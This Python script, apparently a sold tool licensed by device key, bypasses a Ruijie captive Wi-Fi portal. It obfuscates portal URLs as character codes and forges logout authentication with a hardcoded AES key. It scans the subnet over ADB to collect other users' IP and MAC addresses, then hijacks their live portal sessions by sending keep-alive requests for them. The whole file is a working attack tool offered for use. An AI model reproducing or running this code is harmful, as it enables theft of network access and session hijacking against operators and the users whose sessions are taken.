#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Wifi Bypass Script (Key System Version)
- Option 1: Setup Wifi
- Option 2: Scan IP/MAC only (table, press Enter to return)
- Option 3: Test active devices (sequential, progress bar, live active list)
- Option 4: Wifi Bypass (select device, manual switch with number keys)
- Option 5: Reset Expiry Date
- Option 0: Exit
"""

import os, re, sys, time, json, zlib, base64, random, string, hashlib, uuid, socket
import asyncio, aiohttp, requests, subprocess, threading
from datetime import datetime
from urllib.parse import quote, unquote
import urllib3
import ssl as ssl_module

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- COLOR CODES ----------
_w_ = "\033[1;00m"
_g_ = "\033[1;32m"
_y_ = "\033[1;33m"
_r_ = "\033[1;31m"
_c_ = "\033[1;36m"
_p_ = "\033[1;35m"
_b_ = "\033[1;34m"

def _d(arr):
    return "".join([chr(i) for i in arr])

def _o_p():
    return _d([112,111,114,116,97,108,45,97,115])+_d([46,114,117,105,106,105,101])+_d([110,101,116,119,111,114])+_d([107,115,46,99,111,109])

# ===== KEY SYSTEM: Local Key Server URL =====
_KEY_SERVER = "http://localhost:2060/api/keys"
# ===== SECRET KEY =====
SECRET_KEY = b'W1F1_BYP@S_S3CR3T_2026'

HIDDEN_DIR = os.path.join(os.environ.get("PREFIX", os.path.expanduser("~")), "var", ".bypass")
os.makedirs(HIDDEN_DIR, exist_ok=True)

RAW_DEVICES_FILE = os.path.join(HIDDEN_DIR, "raw_devices.json")
ACTIVE_DEVICES_FILE = os.path.join(HIDDEN_DIR, "active_devices.json")

def _g_s_k():
    try:
        a_id = subprocess.check_output(["settings","get","secure","android_id"],stderr=subprocess.DEVNULL).decode().strip()
        model = subprocess.check_output(["getprop","ro.product.model"],stderr=subprocess.DEVNULL).decode().strip()
        brand = subprocess.check_output(["getprop","ro.product.brand"],stderr=subprocess.DEVNULL).decode().strip()
        hw = subprocess.check_output(["getprop","ro.hardware"],stderr=subprocess.DEVNULL).decode().strip()
        if not a_id or a_id=="null": raise Exception()
        return f"DEV-{hashlib.sha256(f'{a_id}-{brand}-{model}-{hw}'.encode()).hexdigest()[:12].upper()}"
    except:
        try:
            model = subprocess.check_output(["getprop","ro.product.model"],stderr=subprocess.DEVNULL).decode().strip()
            return f"DEV-{hashlib.md5(model.encode()).hexdigest()[:12].upper()}"
        except:
            return f"DEV-{uuid.uuid4().hex[:12].upper()}"

def _chk_strg():
    if os.path.exists("/data/data/com.termux/files/usr"):
        while not os.path.exists(os.path.expanduser("~/storage")):
            _clr()
            print(f"{_r_}[ ✘ ] Storage permission not configured!{_w_}")
            if input(f"{_c_}[?] Setup storage permission? (y/n): {_w_}").strip().lower()=='y':
                try:
                    subprocess.run(["termux-setup-storage"])
                    print(f"\n{_y_}[*] Please allow the permission popup...{_w_}")
                    time.sleep(4)
                    if os.path.exists(os.path.expanduser("~/storage")):
                        print(f"{_g_}[ ✔ ] Storage permission linked!{_w_}\n")
                        time.sleep(1)
                        break
                except: print(f"{_r_}[ ✘ ] Failed to execute termux-setup-storage.{_w_}"); sys.exit()
            else: print(f"{_r_}[ ✘ ] Storage permission is mandatory.{_w_}"); sys.exit()

def _clr():
    os.system("clear" if os.name=="posix" else "cls")

def _ln():
    try: print(f"{_y_}-"*os.get_terminal_size()[0])
    except: print(f"{_y_}-"*50)

def _lg(e_s="Checking..."):
    _clr()
    try: term_w=os.get_terminal_size()[0]
    except: term_w=80
    logo = [
        "  _____  _    _ _____       _ _____ ______ ",
        " |  __ \| |  | |_   _|     | |_   _|  ____|",
        " | |__) | |  | | | |       | | | | | |__   ",
        " |  _  /| |  | | | |   _   | | | | |  __|",
        " | | \ \| |__| |_| |_ | |__| |_| |_| |____ ",
        " |_|  \_\\____/|_____| \____/|_____|______|"
    ]
    print(f"\n{_g_}", end="")
    for line in logo:
        print(" "*((term_w-len(line))//2)+line)
    ver = "[ Wifi scan bypass ]"
    print("\n"+" "*((term_w-len(ver))//2)+f"{_y_}{ver}{_g_}")
    wel = "Telegram -> @kyaw1010"
    print("\n"+" "*((term_w-len(wel))//2)+wel+f"{_w_}")
    _ln()
    m_k = _g_s_k()
    print(f"{_w_}[*] Device ID : {_c_}{m_k}{_w_}")
    if e_s: print(f"{_w_}[*] Expiry    : {_y_}{e_s}{_w_}")
    _ln()

class _A_M_:
    def __init__(self):
        self.expiry_status = "Checking..."
        self.exp_time = 0
        self.secret_key = SECRET_KEY
        self.local_file = os.path.join(HIDDEN_DIR, "system_expiry.sys")

    def _get_hash(self, exp, lt):
        return hashlib.md5(f"{exp}:{lt}:{_g_s_k()}:{self.secret_key.decode()}".encode()).hexdigest()

    def save_local_exp(self, exp, lt):
        try:
            with open(self.local_file,"w") as f:
                json.dump({"exp":exp,"last_time":lt,"hash":self._get_hash(exp,lt)},f)
        except: pass

    def get_local_exp(self):
        try:
            if os.path.exists(self.local_file):
                with open(self.local_file) as f:
                    d = json.load(f)
                if d.get("hash")==self._get_hash(d["exp"],d["last_time"]):
                    return d["exp"],d["last_time"]
        except: pass
        return 0,0

    def check_approval_silent(self):
        ct = time.time()
        try:
            res = requests.get(f"{_KEY_SERVER}?t={ct}",timeout=5)
            if res.status_code==200:
                data = res.json()
                keys = data.get("keys",[])
                exp = data.get("expirations",{})
                mk = _g_s_k()
                if mk in keys:
                    et = exp.get(mk,0)
                    if et>ct:
                        self.exp_time=et; self.save_local_exp(et,ct); self._update_status(et,ct)
                        return True,"SUCCESS"
                    else: self.expiry_status="Expired"; return False,"EXPIRED"
                else: self.expiry_status="Not Registered"; return False,"DENIED"
        except: pass
        le,lt = self.get_local_exp()
        if le>0:
            if ct<lt-60: self.expiry_status="Time Spoofing!"; return False,"SPOOFED"
            if le>ct: self.exp_time=le; self._update_status(le,ct); self.save_local_exp(le,ct); return True,"SUCCESS"
            else: self.expiry_status="Expired"; return False,"EXPIRED"
        self.expiry_status="Offline/Error"; return False,"ERROR"

    def _update_status(self, et, ct):
        rem = et-ct
        d=int(rem//86400); h=int((rem%86400)//3600); m=int((rem%3600)//60)
        if d>0: self.expiry_status=f"{d}D {h}H"
        elif h>0: self.expiry_status=f"{h}H {m}M"
        else: self.expiry_status=f"{m}M"

    def reset_expiry(self):
        if os.path.exists(self.local_file): os.remove(self.local_file)
        self.exp_time=0; self.expiry_status="Checking..."

class _S_:
    def __init__(self):
        self.baseurl = _d([104,116,116,112,58,47,47])+_d([49,48,46,52,52,46])+_d([55,55,46,50,52,48])+_d([58,50,48,54,48])
        self.username_get_url = self.baseurl+_d([47,117,115,101,114,110,97,109,101,95,103,101,116])
        self.online_info_url = self.baseurl+_d([47,115,101,114,47,111,110,108,105,110,101,95,105,110,102,111])
        self.logout_url = self.baseurl+_d([47,115,101,114,47,108,111,103,111,117,116])

    def set(self):
        os.makedirs(HIDDEN_DIR, exist_ok=True)
        print(f"\n{_y_}[*] Initializing Setup Process...{_w_}"); time.sleep(0.5)
        print(f"{_c_}[*] Checking current session & unbinding...{_w_}")
        if self.unbind(): print(f"{_g_}[ ✔ ] Unbind successful.{_w_}")
        print(f"{_c_}[*] Fetching network configuration...{_w_}")
        try:
            localhost = requests.get("http://192.168.0.1",timeout=10).url
            ip = re.search(r'gw_address=(.*?)&', localhost).group(1)
            print(f"{_g_}[ ✔ ] Gateway IP: {ip}{_w_}")
            headers = {'authority':_o_p(),'accept':'*/*','user-agent':'Mozilla/5.0 (Linux; Android 10; K)'}
            req = requests.get(localhost,headers=headers).text
            session_url = "https://portal-as.ruijienetworks.com"+re.search(r"href='(.*?)'</script>",req).group(1)
            with open(os.path.join(HIDDEN_DIR,"session_url"),"w") as f: f.write(session_url)
            with open(os.path.join(HIDDEN_DIR,"gw_ip"),"w") as f: f.write(ip)
            for f in [RAW_DEVICES_FILE, ACTIVE_DEVICES_FILE]:
                if os.path.exists(f): os.remove(f)
            print(f"{_g_}[ ✔ ] Setup Completed! (Device lists cleared){_w_}")
        except Exception: print(f"{_r_}[ ✘ ] Setup Failed! Ensure you are connected to portal network.{_w_}")

    def unbind(self):
        username = self.username_get()
        if not username: return False
        online_info = self.get_online_info(username)
        if not online_info: return False
        data = self.arrange_data(online_info)
        return self.logout(data,username)

    def username_get(self):
        try: return requests.get(self.username_get_url).json().get("username")
        except: return None

    def get_online_info(self,username):
        try:
            req = requests.get(self.online_info_url,params={"username":username,"usertype":"wifidog"}).json()
            return req["data"]["list"][0]
        except: return None

    def arrange_data(self,info):
        repmac = info["mac"].replace(":","")
        repmac = [repmac[i:i+4] for i in range(0,len(repmac),4)]
        return {"ip":info["ip"],"mac":info["mac"],"ip_req":info["ip"],"mac_req":".".join(repmac)}

    def get_data(self):
        try: return requests.get(self.baseurl).text
        except: return None

    def extract_chap(self,data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)",data)
        if not match: return None
        return {"chap_id":match.group(1),"chap_challenge":match.group(2)}

    def encrypt_cryptojs(self,auth,enc_key):
        from Crypto.Cipher import AES; from Crypto.Util.Padding import pad; from Crypto.Random import get_random_bytes
        salt = get_random_bytes(8)
        key_iv=b''; prev=b''
        while len(key_iv)<48:
            prev=hashlib.md5(prev+enc_key.encode()+salt).digest(); key_iv+=prev
        key=key_iv[:32]; iv=key_iv[32:48]
        cipher=AES.new(key,AES.MODE_CBC,iv)
        encrypted=b"Salted__"+salt+cipher.encrypt(pad(auth.encode(),AES.block_size))
        return base64.b64encode(encrypted).decode()

    def get_auth(self,username):
        enc_key = "RjYkhwzx$2018!"
        data = self.get_data()
        if not data: return None
        chaps = self.extract_chap(data)
        if not chaps: return None
        auth = unquote(chaps["chap_id"])+unquote(chaps["chap_challenge"])+username
        return self.encrypt_cryptojs(auth,enc_key)

    def logout(self,data,username):
        auth = self.get_auth(username)
        if not auth: return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try: return requests.post(self.logout_url,data=payload).json().get("success",False)
        except: return False

# ---------- ADB ----------
ADB_INFO_FILE = os.path.join(HIDDEN_DIR,"adb_connect_info")

def get_adb_port_from_prop():
    try:
        p=subprocess.check_output(["getprop","service.adb.tcp.port"],stderr=subprocess.DEVNULL).decode().strip()
        if p.isdigit() and 1024<=int(p)<=65535: return int(p)
    except: pass
    return None

def get_saved_adb_target():
    p=get_adb_port_from_prop()
    if p: return f"localhost:{p}"
    try:
        with open(ADB_INFO_FILE) as f:
            t=f.read().strip()
            if ":" in t: return t
    except: pass
    return None

def reconnect_adb():
    t=get_saved_adb_target()
    if not t: return False
    print(f"{_y_}[*] ADB reconnect to {t}...{_w_}")
    try:
        subprocess.run(["adb","connect",t],timeout=10,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        time.sleep(1)
        if f"{t}\tdevice" in subprocess.check_output(["adb","devices"],stderr=subprocess.DEVNULL).decode():
            print(f"{_g_}[✔] ADB reconnected.{_w_}"); return True
    except: pass
    return False

def manual_adb_connect():
    print(f"\n{_c_}[*] ADB not connected. You can connect now for later use.{_w_}")
    addr = input(f"{_c_}[?] Enter ADB IP:PORT (or skip): {_w_}").strip()
    if not addr: return False
    if ":" not in addr: print(f"{_r_}[!] Invalid format.{_w_}"); return False
    try:
        subprocess.run(["adb","connect",addr],timeout=10,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        time.sleep(1)
        if f"{addr}\tdevice" in subprocess.check_output(["adb","devices"],stderr=subprocess.DEVNULL).decode():
            print(f"{_g_}[✔] ADB connected to {addr}{_w_}")
            with open(ADB_INFO_FILE,"w") as f: f.write(addr)
            return True
        else: print(f"{_r_}[✘] ADB connection failed.{_w_}")
    except Exception as e: print(f"{_r_}[!] Error: {e}{_w_}")
    return False

def check_adb_available(auto_reconnect=True):
    try:
        out = subprocess.check_output(["adb","devices"],stderr=subprocess.DEVNULL).decode()
        for line in out.split('\n')[1:]:
            if "device" in line and "offline" not in line: return True
    except: pass
    if auto_reconnect and reconnect_adb():
        try:
            out = subprocess.check_output(["adb","devices"],stderr=subprocess.DEVNULL).decode()
            for line in out.split('\n')[1:]:
                if "device" in line and "offline" not in line: return True
        except: pass
    return False

def adb_scan_network():
    gateway="192.168.110.1"
    all_devs=set()
    for _ in range(2):
        procs=[subprocess.Popen(f"adb shell ping -c 1 -W 2 192.168.110.{i}",shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL) for i in range(1,255)]
        time.sleep(4)
        try:
            out = subprocess.check_output("adb shell ip neigh show",shell=True).decode()
            for line in out.split('\n'):
                if 'lladdr' in line:
                    parts=line.split(); ip=parts[0]; mac=parts[parts.index('lladdr')+1]
                    if ip!=gateway and not ip.startswith('192.168.110.1'): all_devs.add((ip,mac))
        except: pass
        if len(all_devs)>=5: break
        time.sleep(1)
    return list(all_devs)

# ---------- GLOBAL FUNCTIONS ----------
def transform_portal_url(url, ip, mac):
    """FIXED: URL-encode MAC address colon characters"""
    url = re.sub(r'ip=[^&]*', f'ip={ip}', url)
    return url

async def get_session_id(session, portal_url, timeout=10):
    """FIXED: Better session extraction with SSL handling"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    try:
        ssl_ctx = ssl_module.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl_module.CERT_NONE
        async with session.get(portal_url, headers=headers, allow_redirects=True, timeout=timeout, ssl=ssl_ctx) as resp:
            final_url = str(resp.url)
            match = re.search(r"[?&]sessionId=([a-f0-9]+)", final_url, re.I)
            if match: return match.group(1)
            text = await resp.text()
            patterns = [
                r"sessionId[='\"\s]*([a-f0-9]+)",
                r"token[='\"\s]*([a-f0-9]+)",
                r"sid[='\"\s]*([a-f0-9]+)",
                r"[?&]sessionId=([a-f0-9]+)",
            ]
            for pattern in patterns:
                match = re.search(pattern, text, re.I)
                if match: return match.group(1)
            return None
    except Exception as e:
        return None

async def check_internet_access(session):
    test_urls = [
        "http://httpbin.org/ip",
        "http://clients3.google.com/generate_204",
        "http://www.google.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in test_urls:
        try:
            async with session.get(url, timeout=5, ssl=False) as resp:
                if resp.status in (200, 204): return True
        except: continue
    return False

async def keep_alive(session, gw_ip, session_id):
    if not session_id: return False
    phone=''.join(random.choices(string.digits,k=6))
    url=f"http://{gw_ip}:2060/wifidog/auth"
    param_sets = [
        {"token":session_id,"phoneNumber":phone},
        {"token":session_id,"phone":phone},
        {"sessionId":session_id,"phoneNumber":phone},
        {"sessionId":session_id,"phone":phone},
        {"token":session_id},
        {"sessionId":session_id},
    ]
    headers={"Connection":"keep-alive","User-Agent":"Mozilla/5.0 (Linux; Android 12; K)"}
    for params in param_sets:
        try:
            async with session.post(url, params=params, headers=headers, timeout=5, ssl=False) as resp:
                if resp.status in (200,302,303,307): return True
        except: continue
    return False

def get_ping():
    try:
        result=subprocess.run(["ping","-c","1","-W","2","8.8.8.8"],capture_output=True,text=True,timeout=3)
        match=re.search(r"time=([0-9.]+)\s*ms",result.stdout)
        if match:
            lat=float(match.group(1))
            if lat<50: return f"{_g_}{lat:.1f}ms{_w_}"
            elif lat<150: return f"{_y_}{lat:.1f}ms{_w_}"
            else: return f"{_r_}{lat:.1f}ms{_w_}"
        return f"{_r_}timeout{_w_}" if "timeout" in result.stdout.lower() else f"{_r_}fail{_w_}"
    except: return f"{_r_}error{_w_}"

# ---------- BYPASS ENGINE ----------
class BypassEngine:
    def __init__(self):
        self.portal_url = None
        self.gw_ip = None
        self.active_devices = []
        self.labels = []
        self.SESSION_LIFETIME = 210

    def load_config(self):
        try:
            with open(os.path.join(HIDDEN_DIR,"session_url")) as f:
                self.portal_url = f.read().strip()
            with open(os.path.join(HIDDEN_DIR,"gw_ip")) as f:
                self.gw_ip = f.read().strip()
            return True
        except:
            return False

    def load_active_devices(self):
        if not os.path.exists(ACTIVE_DEVICES_FILE): return False
        try:
            with open(ACTIVE_DEVICES_FILE) as f:
                data = json.load(f)
            self.active_devices = data.get("devices", [])
            if not self.active_devices: return False
            self.labels = [f"Device-{i+1}" for i in range(len(self.active_devices))]
            return True
        except:
            return False

    async def _get_full_session(self, session, ip, mac):
        url = transform_portal_url(self.portal_url, ip, mac)
        sid = await get_session_id(session, url, timeout=5)
        if not sid: return None, 0
        if not await keep_alive(session, self.gw_ip, sid): return None, 0
        if not await check_internet_access(session): return None, 0
        return sid, time.time() + self.SESSION_LIFETIME

    async def run_selective_bypass(self, start_idx: int):
        if not self.load_config() or not self.load_active_devices():
            print(f"{_r_}[!] Setup / active devices missing.{_w_}")
            return
        print(f"\n{_g_}Active Devices:{_w_}")
        for i, (ip, mac) in enumerate(self.active_devices, 1):
            print(f"  {_c_}{i}{_w_}) {ip:<15} {mac}")
        try:
            choice = input(f"{_c_}Select device number (1-{len(self.active_devices)}): {_w_}").strip()
            idx = int(choice) - 1
            if idx < 0 or idx >= len(self.active_devices): raise ValueError
        except:
            print(f"{_r_}[!] Invalid selection.{_w_}")
            return
        current_idx = idx
        import tty, termios, select
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try: tty.setraw(fd)
        except: old_settings = None
        print(f"{_y_}[*] Starting bypass with {self.labels[current_idx]} ({self.active_devices[current_idx][0]}){_w_}")
        print(f"{_y_}[*] Press number keys (1-{len(self.active_devices)}) to switch device. Ctrl+C to exit.{_w_}")
        async with aiohttp.ClientSession() as session:
            ip, mac = self.active_devices[current_idx]
            label = self.labels[current_idx]
            sid, expires = await self._get_full_session(session, ip, mac)
            if not sid:
                print(f"{_r_}[!] Failed to get session for {label}.{_w_}")
                if old_settings: termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                return
            last_keep = time.time()
            net_fail = 0
            switch_queue = asyncio.Queue()
            async def read_keys():
                nonlocal current_idx
                while True:
                    if old_settings is None:
                        await asyncio.sleep(0.1)
                        continue
                    r, _, _ = select.select([sys.stdin], [], [], 0.1)
                    if r:
                        ch = sys.stdin.read(1)
                        if ch == '\x03': raise KeyboardInterrupt
                        if ch in '123456789':
                            new_idx = int(ch) - 1
                            if 0 <= new_idx < len(self.active_devices) and new_idx != current_idx:
                                switch_queue.put_nowait(new_idx)
                    await asyncio.sleep(0.05)
            key_task = asyncio.create_task(read_keys())
            try:
                while True:
                    now = time.time()
                    if not switch_queue.empty():
                        new_idx = await switch_queue.get()
                        current_idx = new_idx
                        ip, mac = self.active_devices[current_idx]
                        label = self.labels[current_idx]
                        print(f"\n{_y_}[!] Switching to {label}...{_w_}")
                        sid, expires = await self._get_full_session(session, ip, mac)
                        if not sid:
                            print(f"{_r_}[!] Failed to get session for {label}.{_w_}")
                            continue
                        last_keep = now; net_fail = 0
                        print(f"{_g_}[✔] Switched to {label}.{_w_}")
                    if now >= expires:
                        print(f"\n{_y_}[!] Session expired for {label}. Re-authenticating...{_w_}")
                        sid, expires = await self._get_full_session(session, ip, mac)
                        if not sid:
                            print(f"{_r_}[!] Failed to re-authenticate {label}.{_w_}")
                            break
                        last_keep = now; net_fail = 0
                    if now - last_keep >= 20:
                        if not await keep_alive(session, self.gw_ip, sid):
                            print(f"\n{_y_}[!] Keep-alive fail. Re-authenticating...{_w_}")
                            sid, expires = await self._get_full_session(session, ip, mac)
                            if not sid:
                                print(f"{_r_}[!] Failed to re-authenticate {label}.{_w_}")
                                break
                        last_keep = now
                    if not await check_internet_access(session):
                        net_fail += 1
                        if net_fail >= 1:
                            print(f"\n{_r_}[!] Internet lost. Re-authenticating...{_w_}")
                            sid, expires = await self._get_full_session(session, ip, mac)
                            if not sid:
                                print(f"{_r_}[!] Failed to re-authenticate {label}.{_w_}")
                                break
                            net_fail = 0
                    else: net_fail = 0
                    rem = int(expires - now)
                    ts = datetime.now().strftime("%H:%M:%S")
                    sys.stdout.write(f"\r{_w_}[{ts}] {label} ({self.active_devices[current_idx][0]}) | Remaining: {rem}s | SID: {sid[:8]}...    ")
                    sys.stdout.flush()
                    await asyncio.sleep(2)
            except KeyboardInterrupt: pass
            finally:
                key_task.cancel()
                if old_settings is not None: termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
                print(f"\n{_y_}[*] Bypass ended.{_w_}")

# ---------- Option 3: Sequential active test ----------
async def test_raw_devices_sequential():
    try:
        with open(os.path.join(HIDDEN_DIR,"session_url")) as f: portal_url = f.read().strip()
        with open(os.path.join(HIDDEN_DIR,"gw_ip")) as f: gw_ip = f.read().strip()
    except:
        print(f"{_r_}[!] Setup not done. Run Option 1 first.{_w_}")
        return
    if not os.path.exists(RAW_DEVICES_FILE):
        print(f"{_r_}[!] No raw list. Run Option 2 first.{_w_}")
        return
    with open(RAW_DEVICES_FILE) as f: raw = json.load(f).get("devices", [])
    if not raw:
        print(f"{_r_}[!] Raw list empty.{_w_}")
        return
    total = len(raw)
    active_list = []
    print(f"\n{_y_}[*] Testing {total} devices...{_w_}")
    print(f"{'─'*50}")
    print(f"\n{_g_}Active Devices Found:{_w_}")
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print(f"{'─'*40}")
    print()
    async with aiohttp.ClientSession() as session:
        for idx, (ip, mac) in enumerate(raw, 1):
            pct = idx * 100 // total
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            lines_above = 1 + len(active_list) + 1
            sys.stdout.write(f"\033[{lines_above}A")
            sys.stdout.write(f"\r{_y_}Progress: |{bar}| {idx}/{total} ({pct}%) | Testing: {ip}{_w_}\n")
            sys.stdout.write(f"\033[{lines_above}B")
            sys.stdout.flush()
            try:
                url = transform_portal_url(portal_url, ip, mac)
                sid = await get_session_id(session, url, timeout=5)
                if sid:
                    ka_result = await keep_alive(session, gw_ip, sid)
                    if ka_result:
                        net_result = await check_internet_access(session)
                        if net_result:
                            active_list.append((ip, mac))
                            print(f"{_g_}{ip:<20} {mac:<20}{_w_}")
            except: pass
            await asyncio.sleep(0.5)
    sys.stdout.write(f"\033[1A")
    sys.stdout.write(f"\r{_y_}Progress: |████████████████████| {total}/{total} (100%){_w_}  Done!    ")
    sys.stdout.write(f"\033[1B\n")
    if active_list:
        with open(ACTIVE_DEVICES_FILE, "w") as f:
            json.dump({"devices": active_list}, f)
        print(f"\n{_g_}[ ✔ ] {len(active_list)} active devices saved.{_w_}")
    else:
        print(f"\n{_r_}[!] No active devices found.{_w_}")
    input(f"\n{_c_}Press Enter to return to main menu...{_w_}")

# ---------- MAIN ----------
def main():
    _chk_strg()
    auth_mgr = _A_M_()
    auth_mgr.check_approval_silent()

    def continuous_auth_check():
        while True:
            time.sleep(60)
            auth_mgr.check_approval_silent()
    threading.Thread(target=continuous_auth_check, daemon=True).start()

    bypass_engine = BypassEngine()

    while True:
        _lg(auth_mgr.expiry_status)
        print(f"{_w_}[1] {_g_}Setup Wifi{_w_}")
        print(f"{_w_}[2] {_y_}Scan IP/MAC (Raw){_w_}")
        print(f"{_w_}[3] {_y_}Test Active Devices{_w_}")
        print(f"{_w_}[4] {_g_}Selective Bypass{_w_}")
        print(f"{_w_}[5] {_y_}Reset Expiry Date{_w_}")
        print(f"{_w_}[0] {_r_}Exit{_w_}")
        _ln()
        choice = input(f"{_c_}Select Option: {_w_}").strip()

        if choice == '1':
            _S_().set()
            input(f"\n{_c_}Press Enter to return...{_w_}")
        elif choice == '2':
            status, _ = auth_mgr.check_approval_silent()
            if not status:
                print(f"{_r_}[ ✘ ] License expired/denied.{_w_}")
                time.sleep(2)
                continue
            if not check_adb_available(auto_reconnect=True):
                if not manual_adb_connect():
                    print(f"{_r_}[!] ADB connection required.{_w_}")
                    time.sleep(1.5)
                    continue
            print(f"{_y_}[*] Scanning network (IP/MAC)...{_w_}")
            raw = adb_scan_network()
            if raw:
                with open(RAW_DEVICES_FILE, "w") as f:
                    json.dump({"devices": raw}, f)
                print(f"{_g_}[ ✔ ] {len(raw)} devices found.{_w_}")
                print(f"\n{_g_}Scanned Devices:{_w_}")
                print(f"{'IP Address':<20} {'MAC Address':<20}")
                print("-"*40)
                for ip, mac in raw:
                    print(f"{ip:<20} {mac:<20}")
            else:
                print(f"{_r_}[!] No devices found.{_w_}")
            input(f"\n{_c_}Press Enter to return to main menu...{_w_}")
        elif choice == '3':
            status, _ = auth_mgr.check_approval_silent()
            if not status:
                print(f"{_r_}[ ✘ ] License expired/denied.{_w_}")
                time.sleep(2)
                continue
            asyncio.run(test_raw_devices_sequential())
        elif choice == '4':
            status, _ = auth_mgr.check_approval_silent()
            if not status:
                print(f"{_r_}[ ✘ ] License expired/denied.{_w_}")
                time.sleep(2)
                continue
            if not bypass_engine.load_active_devices():
                print(f"{_r_}[!] No active devices. Run Option 3 first.{_w_}")
                time.sleep(1)
                continue
            try:
                asyncio.run(bypass_engine.run_selective_bypass(0))
            except KeyboardInterrupt: pass
            time.sleep(0.5)
        elif choice == '5':
            auth_mgr.reset_expiry()
            print(f"\n{_g_}[ ✔ ] Expiry Reset!{_w_}")
            time.sleep(1)
            status, _ = auth_mgr.check_approval_silent()
            if status: print(f"{_g_}[ ✔ ] Key Approved!{_w_}")
            else: print(f"{_r_}[ ✘ ] EXPIRED / DENIED{_w_}")
            time.sleep(2)
        elif choice == '0':
            print(f"{_y_}[*] Exiting...{_w_}")
            sys.exit()
        else:
            print(f"{_r_}[!] Invalid choice.{_w_}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{_y_}[*] Program terminated.{_w_}")
        sys.exit(0)
